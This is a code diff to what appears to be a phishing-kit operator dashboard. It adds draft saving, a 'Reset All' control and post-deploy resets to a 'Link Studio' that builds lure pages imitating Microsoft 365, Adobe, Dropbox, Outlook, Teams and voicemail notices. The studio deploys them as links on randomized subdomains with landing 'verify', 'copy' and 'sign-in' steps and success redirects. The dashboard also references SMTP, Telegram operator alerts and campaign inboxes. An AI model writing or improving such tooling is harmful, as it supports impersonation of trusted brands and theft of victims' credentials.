@@ -1973,10 +1973,15 @@ HTML_TEMPLATE = r'''
                         </div>
 
                         <!-- TRANSLATION LANGUAGES & DEPLOY -->
-                        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:8px;">
-                            <button type="button" class="lg-default-btn" style="background:#261115; border-color:#5a1c22; color:#f0ebed; padding:8px 14px;">
-                                🌐 LANGUAGE (1)
-                            </button>
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:8px; gap:8px;">
+                            <div style="display:flex; gap:8px;">
+                                <button type="button" class="lg-default-btn" style="background:#261115; border-color:#5a1c22; color:#f0ebed; padding:8px 14px;">
+                                    🌐 LANGUAGE (1)
+                                </button>
+                                <button type="button" class="lg-default-btn" onclick="if(confirm('Reset all Link Studio fields and drafts to clean defaults?')) resetAllEditorsToDefault();" style="background:#1b1215; border-color:#4a1f26; color:#a49498; padding:8px 12px; font-size:11px; cursor:pointer;" title="Reset entire studio and draft to template defaults">
+                                    🔄 Reset All
+                                </button>
+                            </div>
                             <button type="button" class="lg-deploy-btn" onclick="deployLink()">
                                 🚀 Deploy
                             </button>
@@ -3407,6 +3412,7 @@ HTML_TEMPLATE = r'''
                     <button class="ai-modal-close" style="margin-left:auto;font-size:.85em;color:#8b949e" onclick="closeSmtpSettings()">Cancel</button>
                 </div>
             </div>
+        </div>
         <!-- Operator Telegram Setup Modal -->
         <div class="ai-modal" id="operator-telegram-modal" style="display:none" onclick="if(event.target===this)closeOperatorTelegramModal()">
             <div class="ai-modal-box" style="width:480px">
@@ -3525,7 +3531,6 @@ HTML_TEMPLATE = r'''
                 <div id="b2b-camps-list" class="b2b-camp-list">Loading...</div>
             </div>
         </div>
-    </div>
     </div> <!-- Close #page-b2b -->
 
     <!-- Compose New Mail Modal -->
@@ -5523,13 +5528,448 @@ Assigned      : ${inboxes}
             }
         };
 
+        let _studioDraftSaveTimer = null;
+        function debouncedSaveStudioDraft() {
+            clearTimeout(_studioDraftSaveTimer);
+            _studioDraftSaveTimer = setTimeout(saveStudioDraft, 250);
+        }
+
+        function saveStudioDraft() {
+            try {
+                const getVal = id => document.getElementById(id)?.value ?? '';
+                const isChecked = id => document.getElementById(id)?.checked ?? false;
+                const isVis = id => document.getElementById(id)?.dataset?.visible === '1';
+
+                const draft = {
+                    template: getVal('lg-template-select') || 'Microsoft 365',
+                    landing_template: getVal('lg-landing-template') || 'Adobe',
+                    success_template: getVal('lg-success-template') || 'Dropbox',
+                    active_preview_tab: lgCurrentPreviewTab || 'preland',
+                    landing_mode: lgCurrentLandingMode || 'S',
+                    subdomain: getVal('lg-subdomain'),
+                    path: getVal('lg-path'),
+                    path_user_customized: lgPathUserCustomized,
+                    landing_url: getVal('lg-landing-url'),
+
+                    // Preland fields
+                    preland: {
+                        status_tag: getVal('lg-status-tag'),
+                        status_tag_vis: isVis('lg-status-tag-show'),
+                        title: getVal('lg-title'),
+                        title_vis: isVis('lg-title-show'),
+                        desc: getVal('lg-desc'),
+                        desc_vis: isVis('lg-desc-show'),
+                        btn_label: getVal('lg-btn-label'),
+                        btn_label_vis: isVis('lg-btn-label-show'),
+                        btn_color: getVal('lg-btn-color'),
+                        spin_color: getVal('lg-spin-color'),
+                        spin_size: getVal('lg-spin-size'),
+                        foot1: getVal('lg-foot1'),
+                        foot1_vis: isVis('lg-foot1-show'),
+                        foot2: getVal('lg-foot2'),
+                        foot2_vis: isVis('lg-foot2-show'),
+                        card_bg: getVal('lg-card-bg'),
+                        page_color: getVal('lg-page-color'),
+                        blur: getVal('lg-blur-slider'),
+                        bg_image_vis: isVis('lg-bg-image-show'),
+                        bg_image_data: lgBgImageData,
+                        bg_file_txt: document.getElementById('lg-bg-file-txt')?.innerText || '',
+                        logo_image_data: lgLogoImageData,
+                        // Document
+                        doc_name: getVal('lg-doc-name'),
+                        doc_name_vis: isVis('lg-doc-name-show'),
+                        doc_badge: getVal('lg-doc-badge'),
+                        doc_badge_vis: isVis('lg-doc-badge-show'),
+                        doc_meta: getVal('lg-doc-meta'),
+                        doc_meta_vis: isVis('lg-doc-meta-show'),
+                        // Outlook
+                        outlook_sender: getVal('lg-outlook-sender'),
+                        outlook_sender_vis: isVis('lg-outlook-sender-show'),
+                        outlook_subject: getVal('lg-outlook-subject'),
+                        outlook_subject_vis: isVis('lg-outlook-subject-show'),
+                        outlook_meta: getVal('lg-outlook-meta'),
+                        outlook_meta_vis: isVis('lg-outlook-meta-show'),
+                        // Teams
+                        teams_topic: getVal('lg-teams-topic'),
+                        teams_topic_vis: isVis('lg-teams-topic-show'),
+                        teams_organizer: getVal('lg-teams-organizer'),
+                        teams_organizer_vis: isVis('lg-teams-organizer-show'),
+                        teams_time: getVal('lg-teams-time'),
+                        teams_time_vis: isVis('lg-teams-time-show'),
+                        teams_id: getVal('lg-teams-id'),
+                        teams_id_vis: isVis('lg-teams-id-show'),
+                        teams_passcode: getVal('lg-teams-passcode'),
+                        teams_passcode_vis: isVis('lg-teams-passcode-show'),
+                        teams_lobby: getVal('lg-teams-lobby'),
+                        teams_lobby_vis: isVis('lg-teams-lobby-show'),
+                        // Voicemail
+                        vm_caller: getVal('lg-vm-caller'),
+                        vm_caller_vis: isVis('lg-vm-caller-show'),
+                        vm_time: getVal('lg-vm-time'),
+                        vm_time_vis: isVis('lg-vm-time-show'),
+                        vm_duration: getVal('lg-vm-duration'),
+                        vm_duration_vis: isVis('lg-vm-duration-show')
+                    },
+
+                    // Landing fields
+                    landing: {
+                        show_left: isChecked('lg-land-show-left'),
+                        left_title: getVal('lg-land-left-title'),
+                        left_desc: getVal('lg-land-left-desc'),
+                        left_color: getVal('lg-land-left-color'),
+                        title: getVal('lg-land-title'),
+                        desc: getVal('lg-land-desc'),
+                        doc_name: getVal('lg-land-doc-name'),
+                        doc_name_vis: isVis('lg-show-land-doc-name'),
+                        doc_badge: getVal('lg-land-doc-badge'),
+                        doc_badge_vis: isVis('lg-show-land-doc-badge'),
+                        doc_meta: getVal('lg-land-doc-meta'),
+                        doc_meta_vis: isVis('lg-show-land-doc-meta'),
+                        verify_head: getVal('lg-land-verify-head'),
+                        verify_head_vis: isVis('lg-show-land-verify-head'),
+                        verify_desc: getVal('lg-land-verify-desc'),
+                        verify_desc_vis: isVis('lg-show-land-verify-desc'),
+                        steps_head: getVal('lg-land-steps-head'),
+                        steps_head_vis: isVis('lg-show-land-steps-head'),
+                        steps_text: getVal('lg-land-steps-text'),
+                        steps_text_vis: isVis('lg-show-land-steps-text'),
+                        copy_label: getVal('lg-land-copy-label'),
+                        copy_label_vis: isVis('lg-show-land-copy-label'),
+                        signin_label: getVal('lg-land-signin-label'),
+                        signin_label_vis: isVis('lg-show-land-signin-label'),
+                        copy_color: getVal('lg-land-copy-color'),
+                        signin_color: getVal('lg-land-signin-color'),
+                        page_bg: getVal('lg-land-page-bg'),
+                        card_bg: getVal('lg-land-card-bg'),
+                        code_bg: getVal('lg-land-code-bg'),
+                        steps_bg: getVal('lg-land-steps-bg'),
+                        custom_footer: getVal('lg-land-custom-footer'),
+                        blur: getVal('lg-land-blur'),
+                        bg_image_vis: isVis('lg-land-bg-image-show'),
+                        page_bg_data: lgLandingPageBgData,
+                        page_bg_txt: document.getElementById('lg-land-page-bg-txt')?.innerText || '',
+                        left_bg_data: lgLandingLeftBgData,
+                        logo_data: lgLandingLogoData,
+                        card_bg_data: lgLandingCardBgData,
+                        code_bg_data: lgLandingCodeBgData,
+                        steps_bg_data: lgLandingStepsBgData,
+                        auto_open: isChecked('lg-land-auto-open'),
+                        // Mode B
+                        mode_b_hero: getVal('lg-land-b-hero'),
+                        mode_b_hero_vis: isVis('lg-show-land-b-hero'),
+                        mode_b_sender: getVal('lg-land-b-sender'),
+                        mode_b_sender_vis: isVis('lg-show-land-b-sender'),
+                        mode_b_subject: getVal('lg-land-b-subject'),
+                        mode_b_subject_vis: isVis('lg-show-land-b-subject'),
+                        mode_b_banner: getVal('lg-land-b-banner'),
+                        mode_b_banner_vis: isVis('lg-show-land-b-banner'),
+                        // Mode A
+                        mode_a_badge: getVal('lg-land-a-badge'),
+                        mode_a_badge_vis: isVis('lg-show-land-a-badge'),
+                        mode_a_meta: getVal('lg-land-a-meta'),
+                        mode_a_meta_vis: isVis('lg-show-land-a-meta'),
+                        // Mode R
+                        mode_r_desc: getVal('lg-land-r-desc'),
+                        mode_r_desc_vis: isVis('lg-show-land-r-desc')
+                    },
+
+                    // Success fields
+                    success: {
+                        header_color: getVal('lg-succ-header-color'),
+                        page_title: getVal('lg-succ-page-title'),
+                        card_title: getVal('lg-succ-card-title'),
+                        service_name: getVal('lg-succ-service-name'),
+                        page_bg: getVal('lg-succ-page-bg'),
+                        card_bg: getVal('lg-succ-card-bg'),
+                        body_card_bg: getVal('lg-succ-body-card-bg'),
+                        body_text: getVal('lg-succ-body-text'),
+                        footer_text: getVal('lg-succ-footer-text'),
+                        redirect_sec: getVal('lg-succ-redirect-sec'),
+                        blur: getVal('lg-succ-blur'),
+                        bg_image_vis: isVis('lg-succ-bg-show'),
+                        page_bg_data: lgSuccessPageBgData,
+                        page_bg_name: document.getElementById('lg-succ-bg-name')?.innerText || '',
+                        logo_data: lgSuccessLogoData,
+                        banner_data: lgSuccessBannerData,
+                        card_bg_data: lgSuccessCardBgData
+                    }
+                };
+                localStorage.setItem('crimson_studio_draft', JSON.stringify(draft));
+            } catch(e) {}
+        }
+
+        function restoreStudioDraft() {
+            try {
+                const raw = localStorage.getItem('crimson_studio_draft');
+                if (!raw) return false;
+                const draft = JSON.parse(raw);
+                if (!draft || typeof draft !== 'object') return false;
+
+                const setVal = (id, val) => {
+                    const el = document.getElementById(id);
+                    if (el && val !== undefined && val !== null) el.value = val;
+                };
+                const setChecked = (id, checked) => {
+                    const el = document.getElementById(id);
+                    if (el && checked !== undefined) el.checked = Boolean(checked);
+                };
+                const setVis = (id, isVis) => {
+                    const btn = document.getElementById(id);
+                    if (!btn || isVis === undefined) return;
+                    btn.dataset.visible = isVis ? '1' : '0';
+                    btn.innerText = isVis ? 'Hide' : 'Show';
+                    btn.classList.toggle('active', Boolean(isVis));
+                    btn.classList.toggle('hidden-state', !isVis);
+                };
+
+                // 1. Restore Template Selections
+                if (draft.template) setVal('lg-template-select', draft.template);
+                if (draft.landing_template) setVal('lg-landing-template', draft.landing_template);
+                if (draft.success_template) setVal('lg-success-template', draft.success_template);
+
+                // 2. Subdomain & Path
+                if (draft.subdomain !== undefined) setVal('lg-subdomain', draft.subdomain);
+                if (draft.path !== undefined) setVal('lg-path', draft.path);
+                if (draft.path_user_customized !== undefined) lgPathUserCustomized = Boolean(draft.path_user_customized);
+                if (draft.landing_url !== undefined) setVal('lg-landing-url', draft.landing_url);
+
+                // 3. Preland
+                const p = draft.preland;
+                if (p) {
+                    setVal('lg-status-tag', p.status_tag);
+                    setVis('lg-status-tag-show', p.status_tag_vis);
+                    setVal('lg-title', p.title);
+                    setVis('lg-title-show', p.title_vis);
+                    setVal('lg-desc', p.desc);
+                    setVis('lg-desc-show', p.desc_vis);
+                    setVal('lg-btn-label', p.btn_label);
+                    setVis('lg-btn-label-show', p.btn_label_vis);
+                    setVal('lg-btn-color', p.btn_color);
+                    setVal('lg-spin-color', p.spin_color);
+                    setVal('lg-spin-size', p.spin_size);
+                    setVal('lg-foot1', p.foot1);
+                    setVis('lg-foot1-show', p.foot1_vis);
+                    setVal('lg-foot2', p.foot2);
+                    setVis('lg-foot2-show', p.foot2_vis);
+                    setVal('lg-card-bg', p.card_bg);
+                    setVal('lg-page-color', p.page_color);
+                    setVal('lg-blur-slider', p.blur);
+                    const blurNum = document.getElementById('lg-blur-num');
+                    if (blurNum && p.blur !== undefined) blurNum.innerText = p.blur + '%';
+                    setVis('lg-bg-image-show', p.bg_image_vis);
+                    if (p.bg_image_data !== undefined) lgBgImageData = p.bg_image_data;
+                    if (p.bg_file_txt) {
+                        const bgTxt = document.getElementById('lg-bg-file-txt');
+                        if (bgTxt) bgTxt.innerText = p.bg_file_txt;
+                    }
+                    if (p.logo_image_data !== undefined) lgLogoImageData = p.logo_image_data;
+
+                    setVal('lg-doc-name', p.doc_name);
+                    setVis('lg-doc-name-show', p.doc_name_vis);
+                    setVal('lg-doc-badge', p.doc_badge);
+                    setVis('lg-doc-badge-show', p.doc_badge_vis);
+                    setVal('lg-doc-meta', p.doc_meta);
+                    setVis('lg-doc-meta-show', p.doc_meta_vis);
+
+                    setVal('lg-outlook-sender', p.outlook_sender);
+                    setVis('lg-outlook-sender-show', p.outlook_sender_vis);
+                    setVal('lg-outlook-subject', p.outlook_subject);
+                    setVis('lg-outlook-subject-show', p.outlook_subject_vis);
+                    setVal('lg-outlook-meta', p.outlook_meta);
+                    setVis('lg-outlook-meta-show', p.outlook_meta_vis);
+
+                    setVal('lg-teams-topic', p.teams_topic);
+                    setVis('lg-teams-topic-show', p.teams_topic_vis);
+                    setVal('lg-teams-organizer', p.teams_organizer);
+                    setVis('lg-teams-organizer-show', p.teams_organizer_vis);
+                    setVal('lg-teams-time', p.teams_time);
+                    setVis('lg-teams-time-show', p.teams_time_vis);
+                    setVal('lg-teams-id', p.teams_id);
+                    setVis('lg-teams-id-show', p.teams_id_vis);
+                    setVal('lg-teams-passcode', p.teams_passcode);
+                    setVis('lg-teams-passcode-show', p.teams_passcode_vis);
+                    setVal('lg-teams-lobby', p.teams_lobby);
+                    setVis('lg-teams-lobby-show', p.teams_lobby_vis);
+
+                    setVal('lg-vm-caller', p.vm_caller);
+                    setVis('lg-vm-caller-show', p.vm_caller_vis);
+                    setVal('lg-vm-time', p.vm_time);
+                    setVis('lg-vm-time-show', p.vm_time_vis);
+                    setVal('lg-vm-duration', p.vm_duration);
+                    setVis('lg-vm-duration-show', p.vm_duration_vis);
+
+                    // Toggle template-specific content input groups
+                    const t = draft.template || 'Microsoft 365';
+                    const preset = LG_PRESETS[t] || LG_PRESETS['Microsoft 365'];
+                    const pType = preset.type || 'document';
+                    const docGrp = document.getElementById('preland-group-document');
+                    const outlookGrp = document.getElementById('preland-group-outlook');
+                    const teamsGrp = document.getElementById('preland-group-teams');
+                    const vmGrp = document.getElementById('preland-group-voicemail');
+                    if (docGrp) docGrp.style.display = (pType === 'document') ? 'block' : 'none';
+                    if (outlookGrp) outlookGrp.style.display = (pType === 'outlook') ? 'block' : 'none';
+                    if (teamsGrp) teamsGrp.style.display = (pType === 'teams') ? 'block' : 'none';
+                    if (vmGrp) vmGrp.style.display = (pType === 'voicemail') ? 'block' : 'none';
+                }
+
+                // 4. Landing
+                const l = draft.landing;
+                if (l) {
+                    setChecked('lg-land-show-left', l.show_left);
+                    setVal('lg-land-left-title', l.left_title);
+                    setVal('lg-land-left-desc', l.left_desc);
+                    setVal('lg-land-left-color', l.left_color);
+                    setVal('lg-land-title', l.title);
+                    setVal('lg-land-desc', l.desc);
+                    setVal('lg-land-doc-name', l.doc_name);
+                    setVis('lg-show-land-doc-name', l.doc_name_vis);
+                    setVal('lg-land-doc-badge', l.doc_badge);
+                    setVis('lg-show-land-doc-badge', l.doc_badge_vis);
+                    setVal('lg-land-doc-meta', l.doc_meta);
+                    setVis('lg-show-land-doc-meta', l.doc_meta_vis);
+                    setVal('lg-land-verify-head', l.verify_head);
+                    setVis('lg-show-land-verify-head', l.verify_head_vis);
+                    setVal('lg-land-verify-desc', l.verify_desc);
+                    setVis('lg-show-land-verify-desc', l.verify_desc_vis);
+                    setVal('lg-land-steps-head', l.steps_head);
+                    setVis('lg-show-land-steps-head', l.steps_head_vis);
+                    setVal('lg-land-steps-text', l.steps_text);
+                    setVis('lg-show-land-steps-text', l.steps_text_vis);
+                    setVal('lg-land-copy-label', l.copy_label);
+                    setVis('lg-show-land-copy-label', l.copy_label_vis);
+                    setVal('lg-land-signin-label', l.signin_label);
+                    setVis('lg-show-land-signin-label', l.signin_label_vis);
+                    setVal('lg-land-copy-color', l.copy_color);
+                    setVal('lg-land-signin-color', l.signin_color);
+                    setVal('lg-land-page-bg', l.page_bg);
+                    setVal('lg-land-card-bg', l.card_bg);
+                    setVal('lg-land-code-bg', l.code_bg);
+                    setVal('lg-land-steps-bg', l.steps_bg);
+                    setVal('lg-land-custom-footer', l.custom_footer);
+                    setVal('lg-land-blur', l.blur);
+                    const lBlurNum = document.getElementById('lg-land-blur-num');
+                    if (lBlurNum && l.blur !== undefined) lBlurNum.innerText = l.blur + '%';
+                    setVis('lg-land-bg-image-show', l.bg_image_vis);
+                    if (l.page_bg_data !== undefined) lgLandingPageBgData = l.page_bg_data;
+                    if (l.page_bg_txt) {
+                        const lBgTxt = document.getElementById('lg-land-page-bg-txt');
+                        if (lBgTxt) lBgTxt.innerText = l.page_bg_txt;
+                    }
+                    if (l.left_bg_data !== undefined) lgLandingLeftBgData = l.left_bg_data;
+                    if (l.logo_data !== undefined) lgLandingLogoData = l.logo_data;
+                    if (l.card_bg_data !== undefined) lgLandingCardBgData = l.card_bg_data;
+                    if (l.code_bg_data !== undefined) lgLandingCodeBgData = l.code_bg_data;
+                    if (l.steps_bg_data !== undefined) lgLandingStepsBgData = l.steps_bg_data;
+                    setChecked('lg-land-auto-open', l.auto_open);
+
+                    setVal('lg-land-b-hero', l.mode_b_hero);
+                    setVis('lg-show-land-b-hero', l.mode_b_hero_vis);
+                    setVal('lg-land-b-sender', l.mode_b_sender);
+                    setVis('lg-show-land-b-sender', l.mode_b_sender_vis);
+                    setVal('lg-land-b-subject', l.mode_b_subject);
+                    setVis('lg-show-land-b-subject', l.mode_b_subject_vis);
+                    setVal('lg-land-b-banner', l.mode_b_banner);
+                    setVis('lg-show-land-b-banner', l.mode_b_banner_vis);
+                    setVal('lg-land-a-badge', l.mode_a_badge);
+                    setVis('lg-show-land-a-badge', l.mode_a_badge_vis);
+                    setVal('lg-land-a-meta', l.mode_a_meta);
+                    setVis('lg-show-land-a-meta', l.mode_a_meta_vis);
+                    setVal('lg-land-r-desc', l.mode_r_desc);
+                    setVis('lg-show-land-r-desc', l.mode_r_desc_vis);
+                }
+
+                // 5. Success
+                const s = draft.success;
+                if (s) {
+                    setVal('lg-succ-header-color', s.header_color);
+                    setVal('lg-succ-page-title', s.page_title);
+                    setVal('lg-succ-card-title', s.card_title);
+                    setVal('lg-succ-service-name', s.service_name);
+                    setVal('lg-succ-page-bg', s.page_bg);
+                    setVal('lg-succ-card-bg', s.card_bg);
+                    setVal('lg-succ-body-card-bg', s.body_card_bg);
+                    setVal('lg-succ-body-text', s.body_text);
+                    setVal('lg-succ-footer-text', s.footer_text);
+                    setVal('lg-succ-redirect-sec', s.redirect_sec);
+                    setVal('lg-succ-blur', s.blur);
+                    const sBlurNum = document.getElementById('lg-succ-blur-num');
+                    if (sBlurNum && s.blur !== undefined) sBlurNum.innerText = s.blur + '%';
+                    setVis('lg-succ-bg-show', s.bg_image_vis);
+                    if (s.page_bg_data !== undefined) lgSuccessPageBgData = s.page_bg_data;
+                    if (s.page_bg_name) {
+                        const sBgTxt = document.getElementById('lg-succ-bg-name');
+                        if (sBgTxt) sBgTxt.innerText = s.page_bg_name;
+                    }
+                    if (s.logo_data !== undefined) lgSuccessLogoData = s.logo_data;
+                    if (s.banner_data !== undefined) lgSuccessBannerData = s.banner_data;
+                    if (s.card_bg_data !== undefined) lgSuccessCardBgData = s.card_bg_data;
+                }
+
+                // 6. Restore Landing Mode & Preview Tab
+                if (draft.landing_mode) {
+                    setLandingMode(draft.landing_mode);
+                }
+                const activeTab = draft.active_preview_tab || 'preland';
+                setPreviewTab(activeTab);
+
+                updateLeftPanelControlsState();
+                updateUrlPreview();
+                updatePreviewTitle();
+                renderRealtimePreview();
+                return true;
+            } catch(e) {
+                console.warn('Error restoring studio draft:', e);
+                return false;
+            }
+        }
+
+        function resetAllEditorsToDefault() {
+            try { localStorage.removeItem('crimson_studio_draft'); } catch(e){}
+
+            // Reset image data variables
+            lgBgImageData = null;
+            lgLogoImageData = null;
+            const bgTxt = document.getElementById('lg-bg-file-txt');
+            if (bgTxt) bgTxt.innerText = 'No file chosen';
+
+            lgLandingLogoData = null;
+            lgLandingLeftBgData = null;
+            lgLandingPageBgData = '/static/img/bg_blueprint.jpg';
+            lgLandingCardBgData = null;
+            lgLandingCodeBgData = null;
+            lgLandingStepsBgData = null;
+            const landBgTxt = document.getElementById('lg-land-page-bg-txt');
+            if (landBgTxt) landBgTxt.innerText = 'Blueprint Floor Plan (Default)';
+            const landLogoInp = document.getElementById('lg-land-logo-file');
+            if (landLogoInp) landLogoInp.value = '';
+
+            lgSuccessLogoData = null;
+            lgSuccessBannerData = null;
+            lgSuccessPageBgData = '';
+            lgSuccessCardBgData = null;
+            const succBgTxt = document.getElementById('lg-succ-bg-name');
+            if (succBgTxt) succBgTxt.innerText = 'Blueprint Floor Plan (Default)';
+
+            // Reset template select to default
+            const tSel = document.getElementById('lg-template-select');
+            if (tSel) tSel.value = 'Microsoft 365';
+
+            onTemplateSelectChange();
+            randomizeSubdomain();
+            setPreviewTab('preland');
+            updateUrlPreview();
+            renderRealtimePreview();
+        }
+
         async function initLinkGenerator() {
             await syncDomainsDropdown();
-            onTemplateSelectChange();
+            const restored = restoreStudioDraft();
+            if (!restored) {
+                onTemplateSelectChange();
+            }
             loadDeploymentsTable();
             updateUrlPreview();
             updateLeftPanelControlsState();
-            setPreviewTab('preland');
         }
 
         function onTemplateSelectChange() {
@@ -5626,7 +6066,8 @@ Assigned      : ${inboxes}
 
         function resetCustomizations() {
             onTemplateSelectChange();
-            showToast('All customizations reset to template defaults');
+            debouncedSaveStudioDraft();
+            showToast('Pre-landing customizations reset to template defaults');
         }
 
         function resetBtnColor() {
@@ -6131,7 +6572,8 @@ Assigned      : ${inboxes}
         }
 
         function resetLandingCustomizations() {
-            onLandingTemplateChange();
+            onLandingTemplateChange(false);
+            debouncedSaveStudioDraft();
             showToast('Landing editor reset to template defaults');
         }
 
@@ -6340,7 +6782,8 @@ Assigned      : ${inboxes}
         }
 
         function resetSuccessCustomizations() {
-            onSuccessTemplateChange();
+            onSuccessTemplateChange(false);
+            debouncedSaveStudioDraft();
             showToast('Success editor reset to template defaults');
         }
 
@@ -6409,6 +6852,7 @@ Assigned      : ${inboxes}
                 updatePreviewTitle();
                 renderRealtimePreview();
             }
+            debouncedSaveStudioDraft();
         }
 
         function updateLeftPanelControlsState() {
@@ -6431,6 +6875,7 @@ Assigned      : ${inboxes}
                 updatePreviewTitle();
                 renderRealtimePreview();
             }
+            debouncedSaveStudioDraft();
         }
 
         function setPreviewTab(tab) {
@@ -6441,6 +6886,7 @@ Assigned      : ${inboxes}
             });
             updatePreviewTitle();
             renderRealtimePreview();
+            debouncedSaveStudioDraft();
         }
 
         window.addEventListener('message', function(e) {
@@ -6658,6 +7104,7 @@ Assigned      : ${inboxes}
                 updatePreviewTitle();
                 renderRealtimePreview();
             }
+            debouncedSaveStudioDraft();
         }
 
         let _lgPreviewDebounceTimer = null;
@@ -6954,19 +7401,8 @@ Assigned      : ${inboxes}
                 showToast('🚀 Link deployed & copied: ' + fullUrl);
                 loadDeploymentsTable();
                 
-                // Auto-advance path input to next text slug for this template so sequential deploys don't collide
-                if (!lgPathUserCustomized) {
-                    const list = LG_TEMPLATE_SLUGS[templateName] || [];
-                    if (list.length > 1) {
-                        const curIdx = list.indexOf(path);
-                        const nextSlug = list[(curIdx + 1) % list.length];
-                        const pathInp = document.getElementById('lg-path');
-                        if (pathInp) {
-                            pathInp.value = nextSlug;
-                            onFieldChange();
-                        }
-                    }
-                }
+                // Clear draft and restore fresh template defaults for the next link
+                resetAllEditorsToDefault();
             } catch(e) {
                 showToast('❌ Deploy error: ' + (e.message || e));
                 alert('Deploy error: ' + (e.message || e));
@@ -11574,7 +12010,9 @@ Delegated     : ${inboxesDesc}
         }
 
         async function loadB2BCampaigns() {
-            document.getElementById('b2b-camps-modal').style.display = 'flex';
+            const modal = document.getElementById('b2b-camps-modal');
+            if (modal.parentElement !== document.body) document.body.appendChild(modal);
+            modal.style.display = 'flex';
             const listEl = document.getElementById('b2b-camps-list');
             listEl.innerHTML = '<div class="terminal-line dim">Loading...</div>';
             try {
